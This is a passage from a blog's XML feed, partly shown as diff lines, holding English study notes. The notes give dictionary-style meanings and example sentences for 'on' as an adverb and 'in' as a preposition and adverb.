adverb</h2><ol><li><p>Connected<br>:: on your body or someone’s body</p><ul><li>It’s very cold so put a coat on.</li><li>She wanders around the house with nothing on.</li><li>Can you remember what he had on (&#x3D; was wearing)?</li><li>I tried on a few jackets, but none of them looked nice.</li></ul></li><li><p>Operating<br>:: We use it to show when something is operating or starting to operate.</p><ul><li>Could you switch on the radio?</li><li>Would you turn the TV on? (turn on the TV X)</li><li>You left the bedroom light on.</li></ul></li><li><p>Travel<br>:: into a bus, train, plane, etc., or in the correct position to start using some other method of travelling</p><ul><li>The train suddenly started moving as I was getting on.</li><li>Her horse galloped off as soon as she was on.</li></ul></li><li><p>Moving forward<br>:: continuing forward in time or space</p><ul><li>They never spoke to each other from that day on (&#x3D; after that day).</li><li>What are you doing <U>later on</U>?</li><li>When you’re done with it, would you pass it on to Paul?</li><li>(UK) Move on, please, and let the ambulance through.</li><li>(UK) You cycle on and I’ll meet you there.</li></ul></li><li><p>Happening<br>:: happening or planned</p><ul><li>Is the party still on for tomorrow?</li><li>I’m busy tomorrow, but I’ve got nothing on the day after.</li><li>I’ve got a lot on at the moment.</li><li>Food had to be rationed when the war was on.</li><li>Are there any good movies on (&#x3D; being shown) this week?</li></ul></li></ol>]]></content>
-      
-      
-      <categories>
-          
-          <category> Etc </category>
-          
-          <category> English </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> english </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>English - in (Preposition)</title>
-      <link href="/230418-english-preposition-in/"/>
-      <url>/230418-english-preposition-in/</url>
-      
-        <content type="html"><![CDATA[<ol><li>tag<br>:: explaination<ul><li>examples</li></ul></li></ol><h2 id="in-as-a-preposition"><a href="#in-as-a-preposition" class="headerlink" title="in as a preposition"></a><code>in</code> as a preposition</h2><ol><li><p>Inside<br>:: inside a container, place, or area, or surrounded or closed off by something</p><ul><li>I got stuck in a traffic jam for half an hour.</li><li>How much is that coat on display in the window (&#x3D; in the space behind the window of the shop)?</li><li>I’ve got something in (&#x3D; on the surface of) my eye.</li><li>I never know what’s going on in her head (&#x3D; what she’s thinking about).</li><li>My daughter’s in hospital (US in the hospital) having her tonsils out.</li><li>(US) Is Erika still in school (&#x3D; does she still go to school)?</li></ul></li><li><p>Part<br>:: forming a part of something</p><ul><li>What do you look for in a relationship?</li><li>I can see a future champion in Joely (&#x3D; I think that Joely might become a champion).</li><li>Talent like hers is rare in someone so young.</li></ul></li><li><p>During<br>:: during part or all of a period of time</p><ul><li>Some trees lose their leaves in (the) autumn.</li><li>Bye, see you in the morning (&#x3D; tomorrow morning).</li><li>She was a brilliant gymnast in her youth (&#x3D; when she was young).</li><li>I haven’t had a decent night’s sleep in years&#x2F;ages (&#x3D; for a long time).</li></ul></li><li><p>No more than<br>:: needing or using no more time than a particular amount of time</p><ul><li>Can you finish the job in two weeks?</li><li>They completed the journey in record time (&#x3D; faster than ever done before).</li></ul></li><li><p>Before the end<br>:: before or at the end of a particular period</p><ul><li>We’ll all be dead in a hundred years so there’s no point worrying about it.</li><li>I’m just setting off, so I should be with you in half an hour.</li></ul></li><li><p>Experiencing<br>:: experiencing a situation or condition, or feeling an emotion</p><ul><li>We watched in horror as they pulled the bodies from the wreckage.</li><li>She left in a bit of a hurry.</li><li>You’re in great danger.</li><li>Your car’s in very good condition, considering how old it is.</li></ul></li><li><p>Expressed<br>:: expressed or written in a particular way</p><ul><li>Cheques should be written in ink.</li><li>She usually paints in watercolour.</li><li>He always talks in a whisper.</li></ul></li><li><p>Arrangement<br>:: used to show how things or people are arranged or divided</p><ul><li>We all sat down in a circle.</li><li>The desks were arranged in rows of ten.</li><li>Sometimes customers buy books in twos and threes, but rarely in larger quantities than that.</li><li>People are dying in their thousands from cold and starvation.</li></ul></li><li><p>Envolved<br>:: involved or connected with a particular subject or activity</p><ul><li>I never knew you were in publishing.</li><li>a degree in philosophy</li><li>Changes in atmospheric pressure are producing these strange weather conditions.</li></ul></li><li><p>Wearing<br>:: wearing</p><ul><li>Do you recognize that man in the grey suit?</li><li>Pat can’t resist men in uniform.</li><li>You look nice in green (&#x3D; green clothes).</li></ul></li></ol><h2 id="in-as-an-adverb"><a href="#in-as-an-adverb" class="headerlink" title="in as an adverb"></a><code>in</code> as an adverb</h2><ol><li><p>From outside<br>:: from outside, or toward a centre</p><ul><li>The roof of their house caved in during a hurricane.</li><li>Cut the pastry into a square and turn in the corners.</li></ul></li><li><p>At place<br>:: at home or at work</p><ul><li>When did you get home? I never heard you come in.</li><li>Mr Ellis isn’t in this week.</li></ul></li><li><p>Transport<br>:: having arrived at the place where people can get on or off</p><ul><li>What time is Roz’s flight due in?</li></ul></li></ol>]]></content>
       
       
       <categories>
